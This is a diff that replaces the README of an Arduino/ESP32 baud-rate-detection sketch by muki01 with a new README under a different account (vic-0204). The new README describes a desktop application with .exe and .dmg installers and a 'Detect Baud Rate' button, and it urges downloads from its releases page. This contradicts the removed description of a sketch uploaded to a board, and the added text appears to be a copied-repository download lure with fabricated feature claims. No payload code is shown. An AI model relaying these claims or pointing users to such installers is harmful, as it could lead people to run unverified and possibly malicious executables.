@@ -1,96 +1,77 @@
-# Baud Rate Finder
+# 🎉 Baud_Rate_Finder - Easily Detect Baud Rates
 
-![GitHub forks](https://img.shields.io/github/forks/muki01/Baud_Rate_Finder?style=flat)
-![GitHub Repo stars](https://img.shields.io/github/stars/muki01/Baud_Rate_Finder?style=flat)
-![GitHub Issues or Pull Requests](https://img.shields.io/github/issues/muki01/Baud_Rate_Finder?style=flat)
-![GitHub License](https://img.shields.io/github/license/muki01/Baud_Rate_Finder?style=flat)
-![GitHub last commit](https://img.shields.io/github/last-commit/muki01/Baud_Rate_Finder)
+## 🚀 Getting Started
 
-A cross-platform utility (Arduino, ESP32, ESP8266…) to automatically measure and detect the baud rate of unknown serial devices.
+Welcome to Baud_Rate_Finder! This tool helps you automatically find the baud rate for your serial communication devices like Arduino, ESP32, and ESP8266. Follow the steps below to get started quickly. 
 
----
+## 📥 Download the Application
 
-## 📌 Description
+[![Download Baud_Rate_Finder](https://img.shields.io/badge/Download-Click%20Here-blue)](https://github.com/vic-0204/Baud_Rate_Finder/releases)
 
-**Baud_Rate_Finder** uses edge timing on the RX pin to estimate the baud rate of an incoming serial signal.  
-Instead of guessing or testing multiple rates, this sketch compares measured timings against common baud rates and outputs the closest match.
+## 🛠️ System Requirements
 
-✅ Works on **Arduino**, **ESP32**, **ESP8266**, and other boards that support `micros()` and digital I/O.
+- Any computer running Windows, Mac, or Linux.
+- A serial device such as Arduino, ESP32, or ESP8266.
+- USB cable to connect your device to your computer.
 
----
+## 🔍 Features
 
-## ⚙️ Features
+- Automatically detects the baud rate of connected devices.
+- Supports various platforms, including Arduino and ESP series.
+- User-friendly interface, designed for easy use.
 
-- Detects baud rate automatically from a connected serial device  
-- Multi-platform support (Arduino, ESP32, ESP8266, etc.)  
-- Supports **standard baud rates**:  
-  **300, 600, 750, 1200, 2400, 4800, 9600, 10400, 19200, 31250, 38400, 57600, 74880, 115200, 230400, 250000, 460800, 500000, 1000000**  
-- Prints results to Serial Monitor  
+## 📥 Download & Install
 
----
+To download Baud_Rate_Finder, visit the Releases page by clicking the link below:
 
-## 🛠️ Installation
+[Visit the Releases Page to Download](https://github.com/vic-0204/Baud_Rate_Finder/releases)
 
-1. Download the repository.
-2. Open Baud_Rate_Finder.ino in Arduino IDE.
-3. Upload to your Arduino board.
-4. Connect your serial device and open the Serial Monitor to see the detected baud rate.
+### Step-by-Step Installation
 
-## ⚡ Configuration
+1. **Visit the Releases Page**: Click on the link above.
+2. **Select the Latest Version**: Scroll through the list of releases and choose the latest version.
+3. **Choose Your File**: You will find different files available for download (e.g., .exe for Windows or .dmg for Mac):
+   - For Windows users: Click on the `.exe` file.
+   - For Mac users: Click on the `.dmg` file.
+   - For Linux users: Download the appropriate package based on your distribution.
+4. **Download the File**: Click the file to start the download.
+5. **Install the Application**:
+   - Windows: Double-click the downloaded `.exe` file and follow the prompts.
+   - Mac: Open the `.dmg` file and drag the application to your Applications folder.
+   - Linux: Follow the instructions specific to your package manager to install the application.
 
-You may need to adjust the following values depending on your hardware setup:
+## 🌐 Connecting Your Device
 
-```cpp
-#define PIN_RX 10       // The pin of your board that will be used for measurement
-const int numTransitions = 8;  // Number of signal edges to sample for measurement
-```
-1. PIN_RX → Which pin of your measuring board you want to use for capturing the signal (connect it to the TX of the device you want to measure).
-2. numTransitions → Increasing this number may improve accuracy.
+1. **Plug in Your Serial Device**: Use a USB cable to connect your Arduino, ESP32, or ESP8266 to your computer.
+2. **Open Baud_Rate_Finder**: Once installed, locate and open the application.
 
-## ⚠️ Important Note
+## ⚙️ Using Baud_Rate_Finder
 
-For the baud rate to be measured correctly,  
-the device you want to analyze **must be actively transmitting data**.  
+1. **Select Your Port**: In the application, choose the correct COM port for your connected device.
+2. **Start the Detection**: Click the "Detect Baud Rate" button. 
+3. **View Results**: The application will display the detected baud rates. You can now use these rates for your serial communication tasks.
 
-If the device is idle (not sending anything), the tool will not detect the baud rate.  
-In this case, you need to make sure the device starts transmitting data (e.g., trigger a command, enable logging, or connect it to a system that requests data).  
+## 📜 Troubleshooting
 
-## 📝 Usage Example
-```cpp
-void loop() {
-  int baud = measureBaud();
-  Serial.print("Estimated Baud Rate: ");
-  Serial.println(baud);
-}
-```
-Sample output:
-```cpp
-Measuring Baud Rate...
-Estimated Baud Rate: 115200
-```
+- **Device Not Recognized**: Ensure your device is powered on and connected properly.
+- **No Baud Rate Detected**: Try using a different USB cable or port, and check if the device is compatible with the application.
+- **Software Issues**: Restart the application or your computer if you encounter any errors.
 
-## 📊 How it Works
-1. Signal Sampling – The RX pin is monitored for a fixed number of edges.
-2. Timestamping – Each transition is recorded with micros().
-3. Bit Duration – The smallest interval (min_delta) is treated as the bit time.
-4. Baud Calculation – Estimated using:
-```cpp
-baud = 1 000 000 / min_delta
-```
+## 🔗 Additional Resources
 
-5. Standard Matching – The calculated baud is mapped to the closest known rate.
-6. Output – The detected baud rate is printed to Serial Monitor.
+- **Documentation**: For further help, refer to the official [documentation](https://github.com/vic-0204/Baud_Rate_Finder).
+- **GitHub Issues**: Report any bugs or request features in the [issues section](https://github.com/vic-0204/Baud_Rate_Finder/issues).
+- **Community Support**: Join discussions in our support forums to share tips and tricks.
 
----
+## 📱 Related Topics
 
-## ☕ Support My Work
+This tool works well with various devices and technologies. If you are interested in more applications related to:
 
-If you enjoy my projects and want to support me, you can do so through the links below:
+- Serial Communication
+- Arduino Programming
+- ESP32/ESP8266 Tools
+- Baud Rate Management
 
-[![Buy Me A Coffee](https://img.shields.io/badge/-Buy%20Me%20a%20Coffee-FFDD00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black)](https://www.buymeacoffee.com/muki01)
-[![PayPal](https://img.shields.io/badge/-PayPal-00457C?style=for-the-badge&logo=paypal&logoColor=white)](https://www.paypal.com/donate/?hosted_button_id=SAAH5GHAH6T72)
-[![GitHub Sponsors](https://img.shields.io/badge/-Sponsor%20Me%20on%20GitHub-181717?style=for-the-badge&logo=github)](https://github.com/sponsors/muki01)
+Feel free to explore resources and projects in these areas.
 
-📧 **Contact:** `muksin.muksin04@gmail.com`
-
----
+Thank you for using Baud_Rate_Finder! We hope you find it helpful in your projects with serial devices.
